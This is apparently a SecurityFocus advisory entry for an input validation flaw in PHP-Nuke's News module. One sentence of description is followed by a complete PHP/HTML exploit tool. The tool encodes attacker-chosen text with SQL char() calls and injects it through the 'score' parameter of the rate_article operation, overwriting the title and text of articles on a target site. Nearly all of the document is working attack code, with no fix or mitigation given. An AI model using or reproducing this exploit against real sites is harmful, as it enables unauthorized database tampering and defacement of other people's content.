source: http://www.securityfocus.com/bid/7173/info

It has been reported that an input validation error exists in the index.php file included with PHPNuke as part of the News module. Because of this, an attacker could send a malicious string through PHPNuke that would allow the attacker to manipulate the database and alter information on articles posted on the site.

If magic_quotes_gpc=OFF or ON

<html>
<head>
<title>PHP-Nuke Change News</title>
</head>
<body>
<?
function ascii_phpnuke_exploit($str) {
for ($i=0;$i < strlen($str);$i++) {
if ($i == strlen($str)-1){
$ascii_char.=ord(substr($str,$i));
}else{
$ascii_char.=ord(substr($str,$i)).',';
}
}
return $ascii_char;
}

if (isset($submit)) {

$score="1";
if (isset($title)) {
$score.=", title=char(".ascii_phpnuke_exploit($title).")";
}
if (strlen($hometext)>1) {
$score.=", hometext=char(".ascii_phpnuke_exploit($hometext).")";
}
if (strlen($bodytext)>1){
$score.=", bodytext=char(".ascii_phpnuke_exploit($bodytext).")";
}
?>

<b>Target URL : </b><? echo $target; ?><br><br>
<b>SID : </b><? echo $sid; ?><br><br>
<b>New Title : </b><? echo $title; ?><br><br>
<b>New Story Text : </b><? echo $hometext; ?><br><br>
<b>New Extended Text : </b><? echo $bodytext; ?><br><br>


<form method="POST" action="<? echo $target; ?>/modules.php">
<input type="hidden" name="name" value="News">
<input type="hidden" name="op" value="rate_article">
<input type="hidden" name="sid" value="<? echo $sid; ?>">
<input type="hidden" name="score" value="<? echo $score; ?>">
<input type="submit" name="submit" value="Change the News">
</form>
<input type="submit" value="Back" onclick="history.go(-1)">

<?
}else{
?>

<form method="GET" action="<? echo $PHP_SELF; ?>">
Target URL : <input type="text" name="target"><br>
News SID : <input type="text" name="sid"><br><br>
<b>New Title :</b><br> <input type="text" name="title"><br>
<br><br><b>New Story Text :</b><br><textarea cols="50" rows="12"
name="hometext">&lt;/textarea&gt;
<br><br><br><b>New Extended Text : </b><br><textarea cols="50" rows="12"
name="bodytext">&lt;/textarea&gt;<br><br>
<input type="submit" name="submit" value="Preview">
</form>

<?
}
?>

</body>
</html>